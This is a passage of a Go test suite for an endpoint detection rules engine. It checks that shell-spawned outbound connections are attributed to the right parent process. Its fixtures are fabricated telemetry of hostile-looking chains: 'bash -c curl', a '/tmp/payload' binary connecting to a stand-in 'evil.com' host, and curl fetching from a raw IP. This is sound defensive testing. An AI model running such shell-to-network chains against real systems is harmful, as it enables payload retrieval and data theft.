		{EventID: "exec-curl", HostID: "h7", TimestampNs: bashExecAt + 5_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "h7", TimestampNs: flowAt, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}

	s := openCatalogStore(t)
	ctx := t.Context()
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1, "a shell stamped after its own child's connection must still be attributed")
	assert.Contains(t, findings[0].Description, "/bin/bash")
}

// The tolerance must not become an unbounded window. A shell whose exec really is long after the trigger, past the pad, is not a late
// stamp and must not be attributed.
//
// The connecting process is deliberately recorded AROUND the flow rather than 60s after it. An earlier version of this test put both
// far in the future, and it passed for the wrong reason: the flow process could not be resolved at all, so evaluation returned before
// the window was ever consulted and the test pinned nothing.
func TestShellNetworkConnectStillRejectsAShellFarAfterTheTrigger(t *testing.T) {
	t.Parallel()

	const base = int64(1_000_000_000_000)
	const flowAt = base + 10_000_000_000
	const bashExecAt = flowAt + 60_000_000_000 // an order of magnitude past any plausible handler latency

	events := []api.Event{
		{EventID: "fork-py", HostID: "h8", TimestampNs: base, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "h8", TimestampNs: base + 100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		// The shell exists well before the flow, so the ancestry resolves; only its EXEC is far in the future.
		{EventID: "fork-bash", HostID: "h8", TimestampNs: flowAt - 1_000_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-bash", HostID: "h8", TimestampNs: bashExecAt, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		// The connecting process is resolvable at the flow's instant, so the walk reaches the window check.
		{EventID: "fork-curl", HostID: "h8", TimestampNs: flowAt - 500_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-curl", HostID: "h8", TimestampNs: flowAt - 400_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "h8", TimestampNs: flowAt, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}

	s := openCatalogStore(t)
	ctx := t.Context()
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	// Guard against the vacuous pass: the connecting process must actually resolve, or this proves nothing about the window.
	conn, err := s.GraphReader().GetProcessByPID(ctx, "h8", 200, flowAt)
	require.NoError(t, err)
	require.NotNil(t, conn, "the flow's process must resolve, otherwise the window check is never reached")

	findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings, "60s past the trigger is not stamp skew, so the shell must not be attributed")
}

// A parent edge must be resolved at the CHILD's fork time. Resolving it at the flow's timestamp, and especially at that timestamp
// widened by a forward pad, asks "who holds this PID now": if the parent exited and its PID was reused, the answer is a generation
// that forked AFTER the child, which cannot be its parent. That fabricates an ancestor chain out of an unrelated process.
// spec:server-detection-rules-engine/rules-tolerate-a-process-stamped-after-an-event-that-followed-it/a-child-is-not-attributed-to-a-generation-that-recycled-its-parent-s-pid
func TestShellNetworkConnectDoesNotAttributeAChildToARecycledParentPID(t *testing.T) {
	t.Parallel()

	const base = int64(1_000_000_000_000)
	events := []api.Event{
		{EventID: "fork-py", HostID: "h9", TimestampNs: base, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "h9", TimestampNs: base + 100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		// The real parent: /bin/bash at pid 100, which exits shortly after forking the child.
		{EventID: "fork-bash", HostID: "h9", TimestampNs: base + 1_000_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-bash", HostID: "h9", TimestampNs: base + 1_100_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "h9", TimestampNs: base + 1_500_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-curl", HostID: "h9", TimestampNs: base + 1_600_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "exit-bash", HostID: "h9", TimestampNs: base + 2_000_000_000, EventType: "exit",
			Payload: json.RawMessage(`{"pid":100,"exit_code":0}`)},
		// PID 100 is reused by an unrelated shell, AFTER the child forked. It is inside the flow's window and would be picked by a
		// lookup bounded on the flow's instant.
		{EventID: "fork-zsh", HostID: "h9", TimestampNs: base + 3_000_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-zsh", HostID: "h9", TimestampNs: base + 3_100_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/zsh","args":["zsh"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "h9", TimestampNs: base + 4_000_000_000, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}

	s := openCatalogStore(t)
	ctx := t.Context()
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1)
	assert.Contains(t, findings[0].Description, "/bin/bash", "the child's real parent is the generation alive when it forked")
	assert.NotContains(t, findings[0].Description, "/bin/zsh", "the generation that recycled the PID after the fork is not its parent")
}

// A shell parented at launchd has no parent record to resolve, and that is a match rather than incomplete ancestry: launchd is
// structurally non-shell. The distinction matters because the walk otherwise defers when a parent cannot be resolved, and conflating
// "no parent exists" with "parent not materialised yet" would silence every launchd-parented shell.
func TestShellNetworkConnectFiresForAShellParentedAtLaunchd(t *testing.T) {
	t.Parallel()

	const base = int64(1_000_000_000_000)
	events := []api.Event{
		{EventID: "fork-bash", HostID: "hl", TimestampNs: base, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "exec-bash", HostID: "hl", TimestampNs: base + 100_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":1,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "hl", TimestampNs: base + 200_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-curl", HostID: "hl", TimestampNs: base + 300_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "hl", TimestampNs: base + 400_000_000, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}

	s := openCatalogStore(t)
	ctx := t.Context()
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1, "a launchd-parented shell is a match, not incomplete ancestry")
	assert.Contains(t, findings[0].Description, "/sbin/launchd",
		"pid 1 is what the parent IS, and naming it is what lets an operator write an exclusion for it (issue #831)")
	assert.NotContains(t, findings[0].Description, "(unknown)",
		"the parent is absent from the process table, not unidentifiable")
	assert.Contains(t, findings[0].Description, "/bin/bash")
}

// spec:server-detection-rules-engine/a-launchd-parented-chain-names-pid-1-and-can-be-suppressed/a-launchd-parented-chain-can-be-suppressed-by-a-parent-path-exclusion
//
// TestShellNetworkConnectLaunchdParentIsSuppressible is the half of issue #831 that motivated naming pid 1 at all. Rendering was
// the cheap part; the point was that the class could not be silenced. Before this, every exclusion type needed a parent process
// ROW to match against and a launchd-parented shell has none, so parentExcluded returned false before consulting anything and the
// operator's only option was disabling the rule outright.
func TestShellNetworkConnectLaunchdParentIsSuppressible(t *testing.T) {
	t.Parallel()

	const base = int64(1_000_000_000_000)
	events := []api.Event{
		{EventID: "fork-bash", HostID: "hl2", TimestampNs: base, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "exec-bash", HostID: "hl2", TimestampNs: base + 100_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":1,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "hl2", TimestampNs: base + 200_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-curl", HostID: "hl2", TimestampNs: base + 300_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "hl2", TimestampNs: base + 400_000_000, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}

	s := openCatalogStore(t)
	ctx := t.Context()
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	cases := []struct {
		name      string
		glob      string
		wantFires bool
		why       string
	}{
		{
			name: "an exclusion naming pid 1 suppresses the chain",
			glob: "/sbin/launchd", wantFires: false,
			why: "the operator asked for launchd-parented chains to be silent for this rule, and now can be obeyed",
		},
		{
			name: "an exclusion naming something else leaves it firing",
			glob: "/usr/bin/ssh", wantFires: true,
			why: "suppression must be no broader than what the operator wrote",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			rule := &ShellNetworkConnect{Exclusions: &fakeExclusions{entries: []fakeExcl{
				{ruleID: "shell_network_connect", matchType: api.ExclusionMatchParentPathGlob, value: tc.glob},
			}}}
			findings, err := rule.Evaluate(t.Context(), events, s.GraphReader())
			require.NoError(t, err)
			if tc.wantFires {
				assert.Len(t, findings, 1, tc.why)
				return
			}
			assert.Empty(t, findings, tc.why)
		})
	}
}

// A store failure while resolving a parent edge must surface rather than read as "this process has no parent", which the walk would
// treat as the end of the ancestry and report nothing at all: a transient database error would become a silent detection miss.
func TestShellNetworkConnectPropagatesAParentLookupError(t *testing.T) {
	t.Parallel()
	ctx := t.Context()
	wantErr := errors.New("parent lookup unavailable")

	events := []api.Event{
		{EventID: "net-curl", HostID: "hp", TimestampNs: 1_000_000_000_000, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	// Resolves the connecting process, then fails on its parent, so the error can only come from the parent edge.
	gr := &parentErrReader{stubBlockGraphReader: &stubBlockGraphReader{exists: true, procID: 5}, failPID: 100, err: wantErr}
	_, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, gr)
	require.ErrorIs(t, err, wantErr)
}

// parentErrReader resolves the connecting process normally and fails only for failPID, so a test can isolate the parent edge from the
// flow lookup that precedes it.
type parentErrReader struct {
	*stubBlockGraphReader
	failPID int
	err     error
}

func (r *parentErrReader) GetProcessByPID(ctx context.Context, hostID string, pid int, atNs int64) (*api.Process, error) {
	if pid == r.failPID {
		return nil, r.err
	}
	// The connecting process claims failPID as its parent, so the walk reaches the failing edge.
	return &api.Process{ID: 5, HostID: hostID, PID: pid, PPID: r.failPID, Path: "/usr/bin/curl", ForkTimeNs: atNs - 1}, nil
}

// spec:server-detection-rules-engine/independently-tunable-chain-shapes-are-separate-rules/a-chain-exhibiting-both-signals-raises-one-alert-per-rule
//
// TestSplitRulesBothFireOnAChainDoingBoth replaces TestSuspiciousExecPrefersSuspiciousPathOverNetwork, which pinned the opposite
// behaviour: the merged rule preferred the path-based finding and suppressed the connect one, through a seenShell shared across
// its two passes.
//
// That precedence was a substitute for alert grouping we do not have, not a design choice, and issue #776 gives it up. Two alerts
// is the accepted interim cost of the split, and it is pinned HERE rather than left incidental so that #777, which reconciles
// them at the alert layer where the industry puts it, has a baseline it has to deliberately change.
func TestSplitRulesBothFireOnAChainDoingBoth(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// python3 → sh → /tmp/payload, and that payload then connects out. One attribution chain, both signals.
	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
		{EventID: "net-payload", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":200,"path":"/tmp/payload","uid":501,"protocol":"tcp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":"198.51.100.42","remote_port":443,"remote_hostname":"evil.com"}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	tempFindings, err := (&SuspiciousExec{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, tempFindings, 1, "the temp arm still fires exactly as it did before the split")
	assert.Equal(t, "suspicious_exec", tempFindings[0].RuleID)
	assert.Contains(t, tempFindings[0].Description, "/tmp/payload")

	connectFindings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, connectFindings, 1, "the connect arm now fires on the same chain instead of being suppressed by the temp arm")
	assert.Equal(t, "shell_network_connect", connectFindings[0].RuleID)
	assert.Contains(t, connectFindings[0].Description, "outbound")

	// Two DISTINCT rules, which is what makes this two alerts rather than one deduplicated one: alert dedup keys on
	// (source, host, rule_id, subject), so the same chain under two ids cannot collapse.
	assert.NotEqual(t, tempFindings[0].RuleID, connectFindings[0].RuleID)
}

// spec:server-detection-rules-engine/independently-tunable-chain-shapes-are-separate-rules/an-exclusion-saved-against-one-arm-does-not-silence-the-other
//
// TestExclusionsDoNotLeakBetweenTheSplitRules is the criterion the split was actually for. Under the merged rule a
// parent-path-glob exclusion added to quiet a noisy CI shell on the connect arm also blinded the temp arm, because one rule id
// meant one exclusion set. Two ids means two sets, and this pins both directions: neither arm inherits the other's silence.
func TestExclusionsDoNotLeakBetweenTheSplitRules(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
		{EventID: "net-payload", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":200,"path":"/tmp/payload","uid":501,"protocol":"tcp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	// An exclusion an operator saved against suspicious_exec before the split. Same parent path, same match type; only the id
	// differs, and the id is the whole point.
	excl := &fakeExclusions{entries: []fakeExcl{
		{ruleID: "suspicious_exec", matchType: api.ExclusionMatchParentPathGlob, value: "/usr/bin/python3"},
	}}

	tempFindings, err := (&SuspiciousExec{Exclusions: excl}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, tempFindings, "the saved exclusion still silences the arm it was saved against")

	connectFindings, err := (&ShellNetworkConnect{Exclusions: excl}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, connectFindings, 1,
		"a suspicious_exec exclusion must NOT silence shell_network_connect; that coupling is what the split removes")

	// And the reverse, so neither direction is assumed from the other.
	reverse := &fakeExclusions{entries: []fakeExcl{
		{ruleID: "shell_network_connect", matchType: api.ExclusionMatchParentPathGlob, value: "/usr/bin/python3"},
	}}
	tempStillFires, err := (&SuspiciousExec{Exclusions: reverse}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Len(t, tempStillFires, 1, "a shell_network_connect exclusion must not silence suspicious_exec either")
}

// spec:server-detection-rules-engine/independently-tunable-chain-shapes-are-separate-rules/a-rule-correlating-one-chain-across-several-event-types-is-unaffected
//
// TestSplitRulesDeclareOneEventTypeEach pins what the merge cost and the split recovers.
//
// suspicious_exec declared [exec, network_connect] only because one rule carried two trigger shapes. That matters beyond tidiness:
// the engine DISPATCHES on the declared set (issue #762), so the declaration is a correctness contract, and a rule that
// under-declares is simply never invoked for the batches it would have matched, silently. Each rule now names exactly the one
// event type it acts on, and a future edit that reintroduces a second trigger has to change this line to do it.
func TestSplitRulesDeclareOneEventTypeEach(t *testing.T) {
	t.Parallel()

	assert.Equal(t, []string{"exec"}, (&SuspiciousExec{}).Doc().EventTypes,
		"suspicious_exec triggers on a temp-path exec and nothing else since issue #776")
	assert.Equal(t, []string{"network_connect"}, (&ShellNetworkConnect{}).Doc().EventTypes,
		"shell_network_connect triggers on an outbound connection and nothing else")

	// The requirement is about independently tunable SHAPES, not about a one-type-per-rule cap. dns_c2_beacon correlates a single
	// chain across three kinds of event and is correct to declare all three; a requirement phrased as "one event type per rule"
	// would have made a shipped rule noncompliant, which is what an earlier draft of the delta did.
	var beacon api.Rule
	for _, r := range New(nil) {
		if r.ID() == "dns_c2_beacon" {
			beacon = r
		}
	}
	require.NotNil(t, beacon, "dns_c2_beacon must be registered for this assertion to mean anything")
	assert.ElementsMatch(t, []string{"network_connect", "dns_query", "exec"}, beacon.Doc().EventTypes,
		"a rule correlating one chain across several event types declares all of them and is not required to be split")
}

// TestShellNetworkConnectResolvesTheChainShellsParentAtForkTime pins the invariant lookupParentOf documents, at the one call site
// that used to break it (found by Copilot on #776).
//
// The exec-chain fallback resolved the re-exec'd shell's parent at the TRIGGER timestamp, which asks "who holds this PID now".
// PIDs are reused, so when the real parent had exited and something else had taken its PID by the time the connection happened,
// the rule read the replacement as the shell's parent. Here the replacement is itself a shell, so the walk treated the chain as
// shell-to-shell layering and returned nothing: a missed detection, not merely a mislabelled one.
func TestShellNetworkConnectResolvesTheChainShellsParentAtForkTime(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	events := []api.Event{
		// The real, non-shell parent forks the shell stage.
		{EventID: "rt-fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "rt-exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "rt-fork-zsh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "rt-exec-zsh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/bin/zsh","args":["/bin/zsh","-c","curl ..."],"uid":501,"gid":20}`)},
		// The shell replaces itself with the payload, at its own pid. This is what hides it from the PPID walk (#713).
		{EventID: "rt-exec-curl", HostID: "host-a", TimestampNs: 2200, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","https://198.51.100.9/"],"uid":501,"gid":20}`)},
		// The real parent exits, and its PID is recycled by an unrelated SHELL before the connection happens. A shell
		// specifically, because the walk skips a shell-parented candidate as layering: the misattribution silences the rule
		// rather than merely renaming the parent on the alert.
		{EventID: "rt-exit-py", HostID: "host-a", TimestampNs: 2300, EventType: "exit",
			Payload: json.RawMessage(`{"pid":100,"exit_code":0}`)},
		{EventID: "rt-fork-reuse", HostID: "host-a", TimestampNs: 2400, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "rt-exec-reuse", HostID: "host-a", TimestampNs: 2500, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":1,"path":"/bin/bash","args":["-bash"],"uid":501,"gid":20}`)},
		{EventID: "rt-net", HostID: "host-a", TimestampNs: 2600, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":200,"protocol":"tcp","direction":"outbound","remote_address":"198.51.100.9","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1, "the chain must still be attributed to the parent that forked the shell, not to whatever later took its pid")
	assert.Contains(t, findings[0].Description, "/usr/bin/python3",
		"the finding names the real non-shell parent; naming the recycled /bin/bash would mean the edge was resolved at the wrong instant")
}

// spec:server-detection-rules-engine/one-exec-chain-walk-for-both-shell-chain-rules/a-declined-chain-is-counted-against-the-rule-that-declined-it
//
// TestShellNetworkConnectRecordsAnIncompleteAncestryDecline is the connect arm's half of the observability #829's review asked
// for. Both rules drive the same walk, so both must report a decline; a counter wired on one side only would make the shared
// behaviour look like it happens half as often as it does.
func TestShellNetworkConnectRecordsAnIncompleteAncestryDecline(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// PID 999 has no record, so the shell on the connecting pid's exec chain claims a parent the graph cannot resolve.
	events := []api.Event{
		{EventID: "ia-fork-shell", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":999}`)},
		{EventID: "ia-exec-zsh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":999,"path":"/bin/zsh","args":["zsh","-c","curl ..."],"uid":501,"gid":20}`)},
		{EventID: "ia-exec-curl", HostID: "host-a", TimestampNs: 2200, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":999,"path":"/usr/bin/curl","args":["curl","https://198.51.100.9/"],"uid":501,"gid":20}`)},
		{EventID: "ia-net", HostID: "host-a", TimestampNs: 2300, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":100,"protocol":"tcp","direction":"outbound","remote_address":"198.51.100.9","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	scope := &api.BatchScope{}
	findings, err := (&ShellNetworkConnect{}).EvaluateScoped(ctx, scope, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings, "an unresolved parent means no finding, the same as the temp arm")
	assert.Equal(t, map[string]int{"shell_network_connect": 1}, scope.AncestryIncompleteCounts(),
		"counted against the connect rule's own id, not the rule it shares the walk with")
}

// TestBothRulesEvaluateIdenticallyScopedOrNot pins the ScopedRule contract both rules just adopted: "An implementation MUST behave
// identically either way." Evaluate is what the replay harness and the fixtures use, so a rule whose scoped path diverged would be
// tested through one entry point and shipped through the other.
func TestBothRulesEvaluateIdenticallyScopedOrNot(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	events := []api.Event{
		{EventID: "id-fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "id-exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "id-fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "id-exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "id-fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "id-exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
		{EventID: "id-net", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":200,"protocol":"tcp","direction":"outbound","remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	for _, tc := range []struct {
		name string
		rule api.Rule
	}{
		{"suspicious_exec", &SuspiciousExec{}},
		{"shell_network_connect", &ShellNetworkConnect{}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			plain, err := tc.rule.Evaluate(ctx, events, s.GraphReader())
			require.NoError(t, err)
			scopedRule, ok := tc.rule.(api.ScopedRule)
			require.True(t, ok, "%s must implement ScopedRule to be reached through the engine's scoped path", tc.name)
			scoped, err := scopedRule.EvaluateScoped(ctx, &api.BatchScope{}, events, s.GraphReader())
			require.NoError(t, err)
			require.Len(t, plain, 1)
			require.Len(t, scoped, 1)
			assert.Equal(t, plain[0].RuleID, scoped[0].RuleID)
			assert.Equal(t, plain[0].Description, scoped[0].Description)
		})
	}
}
